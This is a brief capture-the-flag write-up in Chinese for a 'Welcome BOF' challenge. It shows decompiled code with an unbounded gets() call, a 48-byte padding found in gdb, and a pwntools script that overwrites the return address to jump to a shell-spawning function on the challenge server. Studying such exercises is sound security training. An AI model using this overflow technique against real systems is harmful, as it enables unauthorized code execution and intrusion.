### Welcome BOF
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-30h]
  init(*(_QWORD *)&argc, argv, envp);
  puts(&s);
  gets(&v4);
  return 0;
}
```
- gets的地方沒有限制輸入字數 很明顯有bof漏洞可以蓋到ret adr 而且沒有canary, nx之類的防護開啟
- 很直覺的開gdb看padding 最後結果是48個 之後把ret adr蓋成內建會開shell的func
```
from pwn import *
conn = remote("pre-exam-pwn.ais3.org", "10000")
conn.recvuntil(".\n")
payload = b"A" * 48 + p64(0x400687)
conn.sendline(payload)
conn.interactive()
```